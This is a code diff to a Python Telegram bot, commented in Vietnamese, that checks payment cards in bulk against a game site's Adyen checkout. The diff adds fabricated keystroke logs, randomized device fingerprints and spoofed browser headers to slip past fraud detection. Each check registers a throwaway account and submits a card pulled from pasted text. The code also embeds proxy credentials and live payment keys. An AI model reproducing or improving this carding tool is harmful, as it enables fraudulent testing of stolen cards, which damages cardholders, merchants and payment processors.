@@ -17,6 +17,16 @@ from datetime import datetime
 from telegram import Update
 from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, MessageHandler, filters
 
+# Thư viện Fake UserAgent (Từ TESSTTTT2.py)
+try:
+    from fake_useragent import UserAgent
+except ImportError:
+    print("Thiếu thư viện fake_useragent! Vui lòng chạy: pip install fake-useragent")
+    # Fallback class nếu không cài thư viện (để tránh lỗi crash ngay lập tức)
+    class UserAgent:
+        def __init__(self):
+            self.random = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36"
+
 # Import curl_cffi
 try:
     from curl_cffi.requests import AsyncSession
@@ -47,8 +57,8 @@ ADMIN_ID = 7787551672
 # File lưu danh sách người dùng được phép
 ALLOWED_USERS_FILE = "allowed_users.json"
 
-# Cấu hình Proxy cứng từ yêu cầu
-PROXY_STR = "asg.360s5.com:3600:88634867-zone-custom:AetOKcLB"
+# Cấu hình Proxy cứng (Cập nhật từ TESSTTTT2.py: aus.360s5.com)
+PROXY_STR = "aus.360s5.com:3600:88634867-zone-custom:AetOKcLB"
 try:
     p_host, p_port, p_user, p_pass = PROXY_STR.split(":")
     PROXY_URL = f"http://{p_user}:{p_pass}@{p_host}:{p_port}"
@@ -113,12 +123,48 @@ def is_user_allowed(user_id):
     return user_id in users
 
 # ===================================================================
-# === PHẦN 1: THUẬT TOÁN MÃ HÓA ADYEN 4.8.0 (FROM TESSTTTT2.py)
+# === PHẦN 1: THUẬT TOÁN MÃ HÓA ADYEN 4.8.0 & GIẢ LẬP HÀNH VI
 # ===================================================================
 
 def get_current_timestamp():
     """Tạo timestamp theo định dạng ISO 8601 UTC."""
     return datetime.utcnow().isoformat() + 'Z'
+
+def generate_fake_log(length):
+    """
+    Tạo log giả lập hành vi gõ phím của người dùng (Behavioral Biometrics).
+    Mô phỏng: Focus -> Click -> Gõ từng ký tự (KN) -> Change -> Blur
+    (Code từ TESSTTTT2.py)
+    """
+    # Thời gian bắt đầu ngẫu nhiên
+    base_time = random.randint(2000, 5000)
+    events = []
+    
+    # Sự kiện 1: Focus (fo)
+    events.append(f"fo@{base_time}")
+    base_time += random.randint(50, 200)
+    
+    # Sự kiện 2: Click (cl)
+    events.append(f"cl@{base_time}")
+    base_time += random.randint(100, 300)
+    
+    # Sự kiện 3: Keydown (KN) cho từng ký tự
+    for _ in range(length):
+        base_time += random.randint(80, 250) 
+        events.append(f"KN@{base_time}")
+        
+    # Sự kiện 4: Change (ch) & Blur (bl)
+    base_time += random.randint(200, 500)
+    events.append(f"ch@{base_time}")
+    
+    log_string = ",".join(events)
+    
+    return {
+        "log": log_string,
+        "key_count": str(length),
+        "click_count": "1",
+        "focus_count": "1"
+    }
 
 def w(e):
     """Mã hóa base64 một chuỗi hoặc bytes."""
@@ -226,12 +272,15 @@ def format_card_number(card):
     return ' '.join(card[i:i+4] for i in range(0, len(card), 4))
 
 def encrypt_card_data_480(card, month, year, cvc, adyen_key, stripe_key=None, domain=None):
-    """Chuẩn bị và mã hóa dữ liệu thẻ cho Adyen v4.8.0 (Logic từ TESSTTTT2.py)."""
+    """
+    Chuẩn bị và mã hóa dữ liệu thẻ cho Adyen v4.8.0.
+    TÍCH HỢP LOGIC GIẢ LẬP HÀNH VI TỪ TESSTTTT2.py
+    """
     if not all([card, month, year, cvc, adyen_key]):
         raise ValueError("Missing card details or Adyen key")
 
     if not stripe_key:
-        stripe_key = "live_2WKDYLJCMBFC5CFHBXY2CHZF4MUUJ7QU" # Default fallback
+        stripe_key = "live_2WKDYLJCMBFC5CFHBXY2CHZF4MUUJ7QU"
     if not domain:
         domain = "https://taongafarm.com"
         
@@ -240,11 +289,46 @@ def encrypt_card_data_480(card, month, year, cvc, adyen_key, stripe_key=None, do
     
     card_number = format_card_number(card)
 
+    # === TÍCH HỢP GIẢ LẬP HÀNH VI (NEW) ===
+    # Tính toán log cho Card Number
+    card_log_data = generate_fake_log(len(card_number))
+    # Tính toán log cho CVC
+    cvc_log_data = generate_fake_log(len(cvc))
+
     card_detail = {
-        "encryptedCardNumber": {"number": card_number, "generationtime": get_current_timestamp(), "numberBind": "1", "activate": "3", "referrer": referrer, "numberFieldFocusCount": "3", "numberFieldLog": "fo@44070,cl@44071,KN@44082,fo@44324,cl@44325,cl@44333,KN@44346,KN@44347,KN@44348,KN@44350,KN@44351,KN@44353,KN@44354,KN@44355,KN@44356,KN@44358,fo@44431,cl@44432,KN@44434,KN@44436,KN@44438,KN@44440,KN@44440", "numberFieldClickCount": "4", "numberFieldKeyCount": "16"},
-        "encryptedExpiryMonth": {"expiryMonth": month, "generationtime": get_current_timestamp()},
-        "encryptedExpiryYear": {"expiryYear": year, "generationtime": get_current_timestamp()},
-        "encryptedSecurityCode": {"cvc": cvc, "generationtime": get_current_timestamp(), "cvcBind": "1", "activate": "4", "referrer": referrer, "cvcFieldFocusCount": "4", "cvcFieldLog": "fo@122,cl@123,KN@136,KN@138,KN@140,fo@11204,cl@11205,ch@11221,bl@11221,fo@33384,bl@33384,fo@50318,cl@50319,cl@50321,KN@50334,KN@50336,KN@50336", "cvcFieldClickCount": "4", "cvcFieldKeyCount": "6", "cvcFieldChangeCount": "1", "cvcFieldBlurCount": "2", "deactivate": "2"}
+        "encryptedCardNumber": {
+            "number": card_number, 
+            "generationtime": get_current_timestamp(), 
+            "numberBind": "1", 
+            "activate": str(random.randint(3, 5)), # Random số lần activate
+            "referrer": referrer, 
+            "numberFieldFocusCount": card_log_data['focus_count'], 
+            "numberFieldLog": card_log_data['log'], # LOG ĐỘNG
+            "numberFieldClickCount": card_log_data['click_count'], 
+            "numberFieldKeyCount": card_log_data['key_count']
+        },
+        "encryptedExpiryMonth": {
+            "expiryMonth": month, 
+            "generationtime": get_current_timestamp()
+        },
+        "encryptedExpiryYear": {
+            "expiryYear": year, 
+            "generationtime": get_current_timestamp()
+        },
+        "encryptedSecurityCode": {
+            "cvc": cvc, 
+            "generationtime": get_current_timestamp(), 
+            "cvcBind": "1", 
+            "activate": str(random.randint(2, 4)), 
+            "referrer": referrer, 
+            "cvcFieldFocusCount": cvc_log_data['focus_count'], 
+            "cvcFieldLog": cvc_log_data['log'], # LOG ĐỘNG
+            "cvcFieldClickCount": cvc_log_data['click_count'], 
+            "cvcFieldKeyCount": cvc_log_data['key_count'], 
+            "cvcFieldChangeCount": "1", 
+            "cvcFieldBlurCount": "1", 
+            "deactivate": "1"
+        }
     }
 
     adyen_encryptor = AdyenV4_8_0(adyen_key)
@@ -261,7 +345,6 @@ def encrypt_card_data_480(card, month, year, cvc, adyen_key, stripe_key=None, do
 # ===================================================================
 
 def normalize_card(card_str):
-    # Cập nhật Regex chặt chẽ hơn: chỉ chấp nhận phân cách | / : ; - hoặc khoảng trắng
     pattern = r'(\d{13,19})[\s|/;:.-]+(\d{1,2})[\s|/;:.-]+(\d{2,4})[\s|/;:.-]+(\d{3,4})'
     match = re.search(pattern, card_str)
     
@@ -280,9 +363,7 @@ def normalize_card(card_str):
     if len(year) == 2: year = '20' + year
     try:
         year_int = int(year)
-        # Bỏ giới hạn dưới cứng ở đây để cho phép bộ lọc tùy chỉnh xử lý
-        if year_int > 2040: 
-            return None
+        if year_int > 2040: return None
     except ValueError: return None
     
     month = month.zfill(2)
@@ -292,23 +373,17 @@ def extract_cards_from_text(text):
     if not text: return []
     valid_cards = []
     seen = set()
-    
-    # Xử lý từng dòng để tránh Regex ăn lan từ dòng này sang dòng kia
     lines = text.splitlines()
-    
-    # Regex chặt chẽ: Card + (Separators) + Month + ...
     pattern_strict = r'(\d{13,19})[\s|/;:.-]+(\d{1,2})[\s|/;:.-]+(\d{2,4})[\s|/;:.-]+(\d{3,4})'
     
     for line in lines:
         matches = re.findall(pattern_strict, line)
         for m in matches:
-            # Tạo chuỗi tạm để normalize kiểm tra lại logic ngày tháng
             temp_str = f"{m[0]}|{m[1]}|{m[2]}|{m[3]}"
             normalized = normalize_card(temp_str)
             if normalized and normalized not in seen:
                 valid_cards.append(normalized)
                 seen.add(normalized)
-    
     return valid_cards
 
 def validate_luhn(card_number):
@@ -349,7 +424,15 @@ def generate_random_email():
     return f"{name}{random_str}{domain}"
 
 def generate_dadus():
-    user = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    """
+    Tạo chuỗi deviceFingerprint (dadus).
+    (Cập nhật từ TESSTTTT2.py với fake_useragent)
+    """
+    try:
+        user = UserAgent().random
+    except Exception:
+        user = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36"
+        
     json_string = f'{{"version":"1.0.0","deviceFingerprint":"1N39KVvVK8itaGr7odbrTKnBdbwt4n7PoYuk0009040344c{random.randint(100, 999)}iKzBGcrkpIQWp4A1B2M2Y8Asg0004erXqCOncs{random.randint(1000, 9909)}uFhJE00000WIL1VQ3oQKRWT1eb85Gu:40","persistentCookie":[],"components":{{"userAgent":"{user}","webdriver":0,"language":"vi-VN","colorDepth":24,"deviceMemory":8,"pixelRatio":1.25,"hardwareConcurrency":12,"screenWidth":2048,"screenHeight":1152,"availableScreenWidth":2048,"availableScreenHeight":1104,"timezoneOffset":-420,"timezone":"Asia/Bangkok","sessionStorage":1,"localStorage":1,"indexedDb":1,"addBehavior":0,"openDatabase":0,"platform":"Win32","plugins":"29cf71e3d81d74d43a5b0eb79405ba87","canvas":"a4375f9f6804450aa47496883e844553","webgl":"e05e860022c830166bcb93b7a3775148","webglVendorAndRenderer":"Google Inc. (NVIDIA)~ANGLE (NVIDIA, NVIDIA GeForce RTX 2060 (0x00001F08) Direct3D11 vs_5_0 ps_5_0, D3D11)","adBlock":0,"hasLiedLanguages":0,"hasLiedResolution":0,"hasLiedOs":1,"hasLiedBrowser":0,"fonts":"41c37ee7a27152ed8fa4b3e6f2348b1b","audio":"902f0fe98719b779ea37f27528dfb0aa","enumerateDevices":"5f3fdaf4743eaa707ca6b7da65603892"}}}}'
     return base64.b64encode(json_string.encode('utf-8')).decode('utf-8')
 
@@ -363,11 +446,6 @@ def generate_progress_bar(current, total, length=15):
 
 # --- HÀM LỌC FILE NÂNG CAO ---
 def filter_invalid_cards(card_list):
-    """
-    Lọc thẻ trước khi check:
-    1. Luhn sai -> Loại
-    2. Năm <= 2025 -> Loại
-    """
     valid_list = []
     removed_count = 0
     
@@ -424,8 +502,6 @@ async def check_card_core(line, session_semaphore=None):
     price_val = current_config["price"]
     offer_id = current_config["id"]
 
-    # --- [IMPROVED TIME CHECK] ---
-    
     line = line.strip()
     result = {
         "status": "ERROR",
@@ -448,14 +524,11 @@ async def check_card_core(line, session_semaphore=None):
 
     if session_semaphore:
         async with session_semaphore:
-            # Chỉ bắt đầu tính giờ bên trong _execute_check
             return await _execute_check(cc, mm, yyyy, cvc, price_val, offer_id)
     else:
         return await _execute_check(cc, mm, yyyy, cvc, price_val, offer_id)
 
 async def _execute_check(cc, mm, yyyy, cvc, price_val, offer_id):
-    # --- [IMPROVED TIME CHECK] ---
-    # Bắt đầu tính giờ tại đây (khi thread thực sự chạy)
     start_time = time.time()
     
     retry_count = 0
@@ -465,49 +538,110 @@ async def _execute_check(cc, mm, yyyy, cvc, price_val, offer_id):
     while retry_count < max_retries:
         try:
             async with AsyncSession(impersonate=impersonate_ver, proxies=PROXIES_CONFIG, verify=False) as session:
-                # --- BƯỚC 1: LẤY TOKEN ---
-                reg_headers = {'accept': '*/*', 'referer': 'https://taongafarm.com/en/'}
+                # --- BƯỚC 1: LẤY TOKEN (Cập nhật headers từ TESSTTTT2) ---
+                reg_headers = {
+                    'accept': '*/*',
+                    'accept-language': 'vi-VN,vi;q=0.9',
+                    'cache-control': 'no-cache',
+                    'pragma': 'no-cache',
+                    'referer': 'https://taongafarm.com/en/',
+                    'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
+                    'sec-ch-ua-mobile': '?0',
+                    'sec-ch-ua-platform': '"Windows"',
+                    'sec-fetch-dest': 'script',
+                    'sec-fetch-mode': 'no-cors',
+                    'sec-fetch-site': 'same-origin',
+                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
+                }
+                
                 resp_token = await session.get('https://taongafarm.com/api/token.js', headers=reg_headers, timeout=15)
+                
+                # Logic lấy token cải tiến (từ TESSTTTT2)
                 match = re.search(r"window\.csrftoken='([^']+)'", resp_token.text)
+                if not match:
+                    match = re.search(r"window.csrftoken='([^']+)'", resp_token.text)
+                
                 if not match:
                     retry_count += 1
                     continue
                 token = match.group(1)
+                
+                # Manual set cookie _csrf cho an toàn
                 session.cookies.set('_csrf', token, domain='taongafarm.com')
 
-                # --- BƯỚC 2: ĐĂNG KÝ ---
+                # --- BƯỚC 2: ĐĂNG KÝ (Cập nhật payload từ TESSTTTT2) ---
                 current_email = generate_random_email()
+                reg_headers.update({
+                    'accept': 'application/json, text/plain, */*',
+                    'content-type': 'application/json',
+                    'sec-fetch-dest': 'empty',
+                    'sec-fetch-mode': 'cors',
+                    'x-csrf-token': token,
+                })
+
                 reg_data = {
-                    'email': current_email, 'password': 'Minhnhat@@123',
+                    'email': current_email,
+                    'password': 'Minhnhat@@123',
                     'register_info': {
-                        'device': {}, 'lang': 'en', 
-                        'nav': {'cookieEnabled': True, 'platform': 'Win32', 'userAgent': 'Mozilla/5.0'}, 
-                        'ref': 'direct', 'referrer': '', 'url': '/en/', 'urlarg': {}
+                        'device': {},
+                        'lang': 'en',
+                        'nav': {
+                            'cookieEnabled': True,
+                            'platform': 'Win32',
+                            'userAgent': reg_headers['user-agent'],
+                            'languages': ['vi-VN'],
+                            'hardwareConcurrency': 12,
+                            'systemLanguage': 'vi-VN',
+                            'browser': {'name': 'Chrome', 'major': '143', 'version': '143.0.0.0'},
+                            'retina': True,
+                            'screen': '2048X1152 24',
+                        },
+                        'ref': 'direct',
+                        'referrer': '',
+                        'url': '/en/',
+                        'urlarg': {},
                     },
-                    'skip_email_validation': False, 'user_agree_terms': True,
+                    'skip_email_validation': False,
+                    'user_agree_terms': True,
                 }
-                api_headers = reg_headers.copy()
-                api_headers.update({'x-csrf-token': token, 'content-type': 'application/json'})
                 
-                resp_reg = await session.post('https://taongafarm.com/api/login/signup', headers=api_headers, json=reg_data, timeout=15)
+                resp_reg = await session.post('https://taongafarm.com/api/login/signup', headers=reg_headers, json=reg_data, timeout=15)
                 if 'session_portal' not in session.cookies.get_dict():
                     retry_count += 1
                     continue
 
-                # --- BƯỚC 3: MÃ HÓA (Đã update từ TESSTTTT2.py) ---
+                # --- BƯỚC 3: MÃ HÓA (Đã update từ TESSTTTT2.py với logic dynamic) ---
                 encrypted_data = encrypt_card_data_480(cc, mm, yyyy, cvc, ADYEN_KEY, STRIPE_KEY, DOMAIN_URL)
 
-                # --- BƯỚC 4: THANH TOÁN ---
+                # --- BƯỚC 4: THANH TOÁN (Headers & Payload mới từ TESSTTTT2) ---
                 payment_headers = {
+                    'accept': 'application/json, text/plain, */*',
+                    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7,fr-FR;q=0.6,fr;q=0.5',
+                    'baggage': 'sentry-environment=us2,sentry-release=v2.53.0-us2,sentry-public_key=6e2ca40d802e45fba31af28046b579eb,sentry-trace_id=ab92a81ec3c549c7930e4ffec581540e',
+                    'cache-control': 'no-cache',
                     'content-type': 'application/json',
                     'origin': 'https://taongafarm.com',
-                    'referer': 'https://taongafarm.com/en/payment/adyen/checkout/',
+                    'pragma': 'no-cache',
+                    'priority': 'u=1, i',
+                    'referer': 'https://taongafarm.com/en/payment/adyen/checkout/?checkoutRequest=eyJjb3VudHJ5Q29kZUZhbGxiYWNrIjoiR0IiLCJjb3VudHJ5Q29kZU92ZXJyaWRlIjoiIiwiZW1haWwiOiJtaW5obmhhdC4xNDQ0MTdAZ21haWwuY29tIiwiZ2FtZUxhbmd1YWdlIjoiZW4iLCJnYW1lTG9jYWxlIjoiZW5fVVMiLCJvZmZlcklkIjozODMzNCwicGxhdGZvcm1JZCI6IjcwMzQ1NzQ0ODMwNTMwOTg3MjIxIiwicGxhdGZvcm1UeXBlIjoicG9ydGFsIiwicHJpY2VDdXJyZW5jeSI6IkdCUCIsInByaWNlVmFsdWUiOjEuNDcsInF1YW50aXR5IjoxfQ%3D%3D',
+                    'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
+                    'sec-ch-ua-mobile': '?0',
+                    'sec-ch-ua-platform': '"Windows"',
+                    'sec-fetch-dest': 'empty',
+                    'sec-fetch-mode': 'cors',
+                    'sec-fetch-site': 'same-origin',
+                    'sentry-trace': 'ab92a81ec3c549c7930e4ffec581540e-91ec58d1de5321fb',
+                    'user-agent': reg_headers['user-agent'],
                 }
+
                 payment_json_data = {
                     'paymentRequest': {
-                        'riskData': {'clientData': generate_dadus()},
+                        'riskData': {
+                            'clientData': generate_dadus(),
+                        },
                         'paymentMethod': {
-                            'type': 'scheme', 'holderName': '',
+                            'type': 'scheme',
+                            'holderName': '',
                             'encryptedCardNumber': encrypted_data['encryptedCardNumber'],
                             'encryptedExpiryMonth': encrypted_data['encryptedExpiryMonth'],
                             'encryptedExpiryYear': encrypted_data['encryptedExpiryYear'],
@@ -516,17 +650,46 @@ async def _execute_check(cc, mm, yyyy, cvc, price_val, offer_id):
                             'checkoutAttemptId': 'fetch-checkoutAttemptId-failed',
                         },
                         'storePaymentMethod': False,
-                        'browserInfo': {'acceptHeader': '*/*', 'colorDepth': 24, 'language': 'vi-VN', 'javaEnabled': False, 'screenHeight': 1152, 'screenWidth': 2048, 'userAgent': 'Mozilla/5.0', 'timeZoneOffset': -420, 'origin': 'https://taongafarm.com'},
+                        'browserInfo': {
+                            'acceptHeader': '*/*',
+                            'colorDepth': 24,
+                            'language': 'vi-VN',
+                            'javaEnabled': False,
+                            'screenHeight': 1152,
+                            'screenWidth': 2048,
+                            'userAgent': reg_headers['user-agent'],
+                            'timeZoneOffset': -420,
+                        },
+                        'origin': 'https://taongafarm.com',
                         'clientStateDataIndicator': True,
                     },
                     'checkoutRequest': {
-                        'countryCodeFallback': 'GB', 'email': current_email,
-                        'gameLanguage': 'en', 'gameLocale': 'en_US', 
-                        'offerId': offer_id, 'platformId': '70345744830530987221', 
-                        'platformType': 'portal', 'priceCurrency': 'USD', 'priceValue': price_val, 'quantity': 1,
+                        'countryCodeFallback': 'GB',
+                        'countryCodeOverride': '',
+                        'email': current_email,
+                        'gameLanguage': 'en',
+                        'gameLocale': 'en_US',
+                        'offerId': offer_id,
+                        'platformId': '70345744830530987221',
+                        'platformType': 'portal',
+                        'priceCurrency': 'GBP', # TESSTTTT2 uses GBP/USD mixed, but usually GBP in request
+                        'priceValue': price_val, # Note: if TESSTTTT2 hardcoded 73.99, here we use dynamic.
+                        'quantity': 1,
                     },
-                    'browserInfo': {'acceptHeader': '*/*', 'userAgent': 'Mozilla/5.0', 'language': 'en-US'},
-                    'billingInfo': {'countryCode': 'US', 'postalCode': '53227'},
+                    'browserInfo': {
+                        'acceptHeader': '*/*',
+                        'screenWidth': 2048,
+                        'screenHeight': 1152,
+                        'colorDepth': 24,
+                        'userAgent': reg_headers['user-agent'],
+                        'timeZoneOffset': -420,
+                        'language': 'en-US',
+                        'javaEnabled': False,
+                    },
+                    'billingInfo': {
+                        'countryCode': 'US',
+                        'postalCode': '53227',
+                    },
                 }
 
                 resp_pay = await session.post('https://taongafarm.com/payment/adyen/api/checkout/payment', headers=payment_headers, json=payment_json_data, timeout=20)
@@ -589,8 +752,6 @@ async def _execute_check(cc, mm, yyyy, cvc, price_val, offer_id):
             await asyncio.sleep(0.5)
             continue
     
-    # --- [IMPROVED TIME CHECK] ---
-    # Tính thời gian ngay cả khi lỗi timeout để biết proxy chậm thế nào
     end_time = time.time()
     time_taken = round(end_time - start_time, 2)
     return {"status": "ERROR", "is_live": False, "full_log": f"{cc}|{mm}|{yyyy}|{cvc}|ERROR|Timeout or Network Error - Time: {time_taken}s"}
